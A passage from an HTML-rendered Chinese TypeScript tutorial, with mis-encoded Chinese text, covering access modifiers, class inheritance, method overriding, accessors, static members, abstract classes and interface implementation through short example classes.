ç§æœ‰å­—æ®µï¼ˆè¿è¡Œæ—¶ç§æœ‰ï¼‰</td></tr></tbody></table><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;          <span class="hljs-comment">// å…¬å…±å±æ€§ï¼ˆé»˜è®¤ï¼‰</span><br>  <span class="hljs-keyword">protected</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;         <span class="hljs-comment">// å—ä¿æŠ¤å±æ€§</span><br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">secret</span>: <span class="hljs-built_in">string</span>;       <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>  #<span class="hljs-attr">internalCode</span>: <span class="hljs-built_in">number</span>;        <span class="hljs-comment">// ESç§æœ‰å­—æ®µï¼ˆTypeScript 3.8+ï¼‰</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-string">&quot;P1001&quot;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">secret</span> = <span class="hljs-string">&quot;confidential&quot;</span>;<br>    <span class="hljs-variable language_">this</span>.#internalCode = <span class="hljs-number">12345</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Person</span> &#123;<br>  <span class="hljs-title function_">viewDetails</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);    <span class="hljs-comment">// âœ… å…¬å…±å±æ€§</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>);      <span class="hljs-comment">// âœ… å—ä¿æŠ¤å±æ€§ï¼ˆå­ç±»å¯è®¿é—®ï¼‰</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">secret</span>);  <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼ç§æœ‰å±æ€§ä¸å¯è®¿é—®</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.#internalCode); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼ESç§æœ‰å­—æ®µä¸å¯è®¿é—®</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(emp.<span class="hljs-property">name</span>);        <span class="hljs-comment">// âœ…</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(emp.<span class="hljs-property">id</span>);          <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼å—ä¿æŠ¤å±æ€§</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(emp.<span class="hljs-property">secret</span>);      <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼ç§æœ‰å±æ€§</span><br></code></pre></td></tr></table></figure><p><strong>ç±»ç»§æ‰¿ä½“ç³»</strong></p><p>(1) åŸºæœ¬ç»§æ‰¿è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">move</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Moving...&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Woof!&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>dog.<span class="hljs-title function_">move</span>(); <span class="hljs-comment">// âœ… ç»§æ‰¿è‡ªAnimal</span><br>dog.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// âœ… è‡ªèº«æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p>(2) æ„é€ å‡½æ•°ç»§æ‰¿ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Vehicle</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>, <span class="hljs-keyword">public</span> <span class="hljs-attr">brand</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">super</span>(<span class="hljs-keyword">type</span>); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨super</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myCar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&quot;Sedan&quot;</span>, <span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myCar.<span class="hljs-property">type</span>);  <span class="hljs-comment">// &quot;Sedan&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myCar.<span class="hljs-property">brand</span>); <span class="hljs-comment">// &quot;Toyota&quot;</span><br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•é‡å†™ï¼ˆOverrideï¼‰</strong></p><p>è§„åˆ™ï¼š</p><ul><li>ä½¿ç”¨ override å…³é”®å­—ï¼ˆTS 4.3+ï¼‰</li><li>å­ç±»æ–¹æ³•å¿…é¡»å…¼å®¹çˆ¶ç±»æ–¹æ³•ç­¾å</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello!&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Base</span> &#123;<br>  <span class="hljs-keyword">override</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"><span class="hljs-attr">name</span>?: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (name) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span><br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Derived</span>();<br>d.<span class="hljs-title function_">greet</span>();       <span class="hljs-comment">// &quot;Hello!&quot; (è°ƒç”¨çˆ¶ç±»æ–¹æ³•)</span><br>d.<span class="hljs-title function_">greet</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<span class="hljs-comment">// &quot;Hello, Alice!&quot;</span><br></code></pre></td></tr></table></figure><p>é”™è¯¯é‡å†™ç¤ºä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">InvalidDerived</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Base</span> &#123;<br>  <span class="hljs-keyword">override</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) &#123; <br>    <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼ç¼ºå°‘å¯é€‰å‚æ•°çš„æ— å‚è°ƒç”¨æ–¹å¼</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è®¿é—®å™¨ä¿®é¥°ç¬¦ï¼ˆGetter&#x2F;Setterï¼‰</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Temperature</span> &#123;<br>  <span class="hljs-keyword">private</span> _celsius = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// å¸¦è®¿é—®ä¿®é¥°ç¬¦çš„getter/setter</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">get</span> <span class="hljs-title function_">celsius</span>(): <span class="hljs-built_in">number</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_celsius</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">set</span> <span class="hljs-title function_">celsius</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (value &lt; -<span class="hljs-number">273.15</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Invalid temperature&quot;</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_celsius</span> = value;<br>  &#125;<br><br>  <span class="hljs-comment">// åªè¯»å±æ€§ï¼ˆæ— setterï¼‰</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">get</span> <span class="hljs-title function_">fahrenheit</span>(): <span class="hljs-built_in">number</span> &#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_celsius</span> * <span class="hljs-number">9</span>) / <span class="hljs-number">5</span> + <span class="hljs-number">32</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temperature</span>();<br>temp.<span class="hljs-property">celsius</span> = <span class="hljs-number">25</span>;      <span class="hljs-comment">// âœ… è°ƒç”¨setter</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(temp.<span class="hljs-property">fahrenheit</span>); <span class="hljs-comment">// 77 âœ… è°ƒç”¨getter</span><br>temp.<span class="hljs-property">fahrenheit</span> = <span class="hljs-number">100</span>;  <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æ— setter</span><br></code></pre></td></tr></table></figure><p><strong>é™æ€æˆå‘˜ï¼ˆStatic Membersï¼‰</strong></p><p>ç‰¹æ€§ï¼š</p><ol><li>é€šè¿‡ç±»åç›´æ¥è®¿é—®</li><li>ä¸å¯é€šè¿‡å®ä¾‹è®¿é—®</li><li>å¯ç»§æ‰¿</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Database</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Database</span>;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(): <span class="hljs-title class_">Database</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Database</span>.<span class="hljs-property">instance</span>) &#123;<br>      <span class="hljs-title class_">Database</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Database</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Database</span>.<span class="hljs-property">instance</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> version = <span class="hljs-string">&quot;1.0&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// è®¿é—®é™æ€æˆå‘˜</span><br><span class="hljs-keyword">const</span> db = <span class="hljs-title class_">Database</span>.<span class="hljs-title function_">getInstance</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Database</span>.<span class="hljs-property">version</span>); <span class="hljs-comment">// &quot;1.0&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDB</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Database</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">logVersion</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;DB Version:&quot;</span>, <span class="hljs-variable language_">super</span>.<span class="hljs-property">version</span>); <span class="hljs-comment">// è®¿é—®çˆ¶ç±»é™æ€å±æ€§</span><br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">MyDB</span>.<span class="hljs-title function_">logVersion</span>(); <span class="hljs-comment">// &quot;DB Version: 1.0&quot;</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>æœ€å°åŒ–å…¬å¼€æ¥å£ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeContainer</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">internalData</span>: <span class="hljs-built_in">string</span>[] = [];<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">addItem</span>(<span class="hljs-params"><span class="hljs-attr">item</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validate</span>(item);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">internalData</span>.<span class="hljs-title function_">push</span>(item);<br>  &#125;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"><span class="hljs-attr">item</span>: <span class="hljs-built_in">string</span></span>) &#123; ... &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨protectedæ‰©å±•ç‚¹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PluginBase</span> &#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-title function_">coreLogic</span>(<span class="hljs-params"></span>) &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPlugin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">PluginBase</span> &#123;<br>  <span class="hljs-title function_">run</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">coreLogic</span>(); <span class="hljs-comment">// å­ç±»å¯è®¿é—®</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>é¿å…è¿‡åº¦ç»§æ‰¿ï¼ˆç»„åˆä¼˜äºç»§æ‰¿ï¼‰ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨ç»„åˆæ›¿ä»£æ·±å±‚ç»§æ‰¿</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Engine</span> &#123; ... &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Wheels</span> &#123; ... &#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>  <span class="hljs-keyword">private</span> engine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Engine</span>();<br>  <span class="hljs-keyword">private</span> wheels = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Wheels</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-3-æŠ½è±¡ç±»ä¸æ¥å£å®ç°è§„èŒƒ"><a href="#1-2-3-æŠ½è±¡ç±»ä¸æ¥å£å®ç°è§„èŒƒ" class="headerlink" title="1.2.3 æŠ½è±¡ç±»ä¸æ¥å£å®ç°è§„èŒƒ"></a>1.2.3 æŠ½è±¡ç±»ä¸æ¥å£å®ç°è§„èŒƒ</h3><p><strong>æŠ½è±¡ç±»ï¼ˆAbstract Classesï¼‰</strong></p><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ol><li>ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–</li><li>åŒ…å«æŠ½è±¡æ–¹æ³•ï¼ˆæ— å®ç°ï¼‰</li><li>å¯åŒ…å«å…·ä½“å®ç°æ–¹æ³•</li><li>é€šè¿‡ extends ç»§æ‰¿</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-comment">// æŠ½è±¡å±æ€§ï¼ˆå¿…é¡»è¢«å­ç±»å®ç°ï¼‰</span><br>  <span class="hljs-keyword">abstract</span> <span class="hljs-attr">habitat</span>: <span class="hljs-built_in">string</span>;<br>  <br>  <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼ˆæ— å®ç°ï¼‰</span><br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span>;<br>  <br>  <span class="hljs-comment">// å…·ä½“æ–¹æ³•</span><br>  <span class="hljs-title function_">move</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Moving...&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  habitat = <span class="hljs-string">&quot;sky&quot;</span>;  <span class="hljs-comment">// å®ç°æŠ½è±¡å±æ€§</span><br>  <br>  <span class="hljs-comment">// å®ç°æŠ½è±¡æ–¹æ³•</span><br>  <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Chirp!&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// æ‰©å±•æ–°æ–¹æ³•</span><br>  <span class="hljs-title function_">fly</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Flying&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> bird = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bird</span>();<br>bird.<span class="hljs-title function_">makeSound</span>(); <span class="hljs-comment">// &quot;Chirp!&quot;</span><br>bird.<span class="hljs-title function_">move</span>();      <span class="hljs-comment">// &quot;Moving...&quot;</span><br>bird.<span class="hljs-title function_">fly</span>();       <span class="hljs-comment">// &quot;Flying&quot;</span><br><br><span class="hljs-keyword">const</span> animal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ–</span><br></code></pre></td></tr></table></figure><p><strong>æ¥å£å®ç°ï¼ˆInterface Implementationï¼‰</strong></p><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ol><li>ä½¿ç”¨ implements å…³é”®å­—</li><li>å¿…é¡»å®ç°æ‰€æœ‰æ¥å£æˆå‘˜</li><li>ç±»å¯åŒæ—¶å®ç°å¤šä¸ªæ¥å£</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Serializable</span> &#123;<br>  <span class="hljs-title function_">serialize</span>(): <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-comment">// å®ç°å¤šä¸ªæ¥å£</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Logger</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Loggable</span>, <span class="hljs-title class_">Serializable</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[LOG] <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">serialize</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æŠ½è±¡ç±» vs æ¥å£</strong></p><p>| ç‰¹æ€§ | æŠ½è±¡ç±» | æ¥å£ |<br>| å®ä¾‹åŒ– | âŒ ä¸èƒ½ç›´æ¥å®ä¾‹åŒ– | âŒ ä¸èƒ½å®ä¾‹åŒ– |<br>| æ–¹æ³•å®ç° | âœ… å¯åŒ…å«å…·ä½“å®ç°æ–¹æ³• | âŒ åªèƒ½å£°æ˜æ–¹æ³•ç­¾å |<br>| æˆå‘˜ç±»å‹ | å¯åŒ…å«å­—æ®µ&#x2F;æ„é€ å™¨&#x2F;è®¿é—®å™¨ç­‰ | åªèƒ½åŒ…å«æ–¹æ³•å’ŒæŠ½è±¡å±æ€§ |<br>| ç»§æ‰¿æœºåˆ¶ | å•ç»§æ‰¿ï¼ˆextendsï¼‰ | å¤šå®ç°ï¼ˆimplementsï¼‰ |<br>| è®¿é—®ä¿®é¥°ç¬¦ | âœ… æ”¯æŒ | âŒ æ‰€æœ‰æˆå‘˜é»˜è®¤ä¸º public |<br>| ç‰ˆæœ¬å…¼å®¹ | ä¿®æ”¹å¯èƒ½ç ´åå­ç±» | æ–°å¢æˆå‘˜ä¸å½±å“ç°æœ‰å®ç° |</p><p><strong>æ··åˆä½¿ç”¨æ¨¡å¼</strong></p><p>åœºæ™¯ï¼šæŠ½è±¡ç±»å®ç°éƒ¨åˆ†æ¥å£</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> &#123;<br>  <span class="hljs-title function_">area</span>(): <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">perimeter</span>(): <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Polygon</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Shape</span> &#123;<br>  <span class="hljs-comment">// å®ç°éƒ¨åˆ†æ¥å£æ–¹æ³•</span><br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title 